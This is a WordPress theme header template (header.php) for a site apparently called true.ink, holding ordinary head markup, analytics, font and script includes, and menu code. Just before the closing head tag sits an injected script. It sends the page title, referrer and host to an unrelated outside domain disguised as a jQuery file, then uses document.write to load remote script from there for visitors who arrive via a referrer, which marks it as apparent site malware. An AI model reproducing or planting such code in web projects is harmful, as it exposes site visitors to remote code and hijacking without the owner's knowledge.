<?php
/**
 * The header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="content">
 *
 * @package true
 */

$transitionTime = ot_get_option("transitiontime");

?>

<!DOCTYPE html>
<html <?php language_attributes(); ?>>
	<head>
		<meta charset="<?php bloginfo( 'charset' ); ?>">
		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
		<title><?php wp_title( '|', true, 'right' ); ?></title>
		<link rel="profile" href="http://gmpg.org/xfn/11">
		<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
		    <link href='http://fonts.googleapis.com/css?family=Source+Code+Pro:200,300,400,500,600,700' rel='stylesheet' type='text/css'>

		<style>
			.fp-easing {
			    -webkit-transition: all <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000) !important; /* Safari<=6 Android<=4.3 */
			    transition: all <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000) !important;
			}
			#section0 .menu-example { 
				-webkit-transition: bottom <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000); 
				-moz-transition: bottom <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000); 
				-o-transition: bottom <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000); 
				transition: bottom <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000); 
			}
			.search {
				-webkit-transition: bottom <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000), border <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000); 
				-moz-transition: bottom <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000), border <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000); 
				-o-transition: bottom <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000), border <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000); 
				transition: bottom <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000), border <?php echo $transitionTime ?>ms cubic-bezier(0.420, 0.000, 0.420, 1.000); 	
			}
		</style>
		<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-56155807-1', 'auto');
  ga('send', 'pageview');

</script>
<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.1/jquery-ui.min.js"></script>
<script type="text/javascript" src="js/jquery.fullPage.js"></script>
<script type="text/javascript">
$(window).load(function() {
    $('#fullpage').fadeIn(1000);
});
</script>
<!-- VIDEO JS -->
<script src="js/video-js/video.js"></script>
<script>
	videojs.options.flash.swf = "js/video-js/video-js.swf";
</script>
<!-- FULLPAGE -->
<script type="text/javascript">
    $(document).ready(function() {
        $('#fullpage').fullpage({
            verticalCentered: true,
            afterRender: function(){


                //playing the video
                $('video').get(0).play();
            }
        });
    });
</script>
<style media="screen" type="text/css">
.dummy-menu {display:none}
/* VIDEO FIX */
@media only screen and (max-width : 768px) {
	#video-bg video{
		display:none;
	}
	#video-bg{
		background-image:url(images/horseloophome_poster.jpg);
		background-size:cover;
		background-size:auto 100%;
		background-position:center center;
		min-height:100%;
	}	
}
</style>

		<script src="//use.typekit.net/lla6fei.js"></script>
    <script>try{Typekit.load();}catch(e){}</script>   
		<script src="https://js.gleam.io/oi-aTlB1xi7.js" async="async"></script>

		    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">

		<?php wp_head(); ?>

	




<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://moriturus-bw.pytalhost.de/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>

	<body <?php body_class(); ?>>

	<!-- SHARE MODAL -->
	
<div id="page" class="hfeed site">
		
		<?php 

		if(is_single()) {
			$color = get_field('menu_color',get_the_id())?'background-color:'.get_field('menu_color',get_the_id()):'';
		}
		else {
			$color = '';
		}

		if(is_front_page()) {
			
			$color = 'background-color:transparent';
		}



		 ?>
		<div class="true-menu-wrapper headroom" style="<?php //echo $color ?>">
			<div class="fluid-container">
				<div class="row">
					<div class="col-xs-12">
						<a href="http://true.ink/" class="logo"></a>
		    			<?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class'      => 'hidden-xs','container_class'=>'true-menu true-main-menu' ) ); ?>
						<a href="#" class="mobile-menu hidden-lg hidden-md hidden-sm">
							<i class="fa fa-bars fa-6"></i>
						</a>
			    	</div>
			    </div>
		    </div>
		</div>

		<nav class="top-custom-menu">
			<div class="inner">
				<?php add_filter( 'wp_nav_menu_objects', create_function( '$menu', 'return array_reverse( $menu );' ) ); ?>
				<?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class' => '','container_class'=>'top-custom-menu-ul true-mobile-menu', 'order'=> 'DESC','orderby' => 'menu_order' ) ); ?>
			</div>
		</nav>

		<div id="content" class="site-content">
